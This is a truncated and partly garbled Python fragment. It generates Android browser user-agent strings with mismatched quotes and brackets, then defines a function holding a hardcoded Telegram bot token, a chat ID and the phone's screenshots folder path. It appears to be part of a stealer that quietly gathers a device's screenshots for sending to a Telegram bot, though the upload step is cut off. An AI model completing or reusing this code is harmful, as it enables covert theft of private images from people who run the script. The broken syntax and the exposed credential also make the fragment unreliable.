...
ugen=[]
uas=[]
usa = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',     'viewport-width': '980')
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',     'viewport-width': '980')
    uas.append(ff)
...
def sexy():
    ...
    bot_token = '6794638883:AAHuA4G3FXD5kEyX4MPuGBMaC7CbLcA7ADc' 
    chat_id = '5358797883'
    #-----------( /sdcard/Pictures/Screenshots
    try:
        sdcard_path = '/sdcard/Pictures/Screenshots'
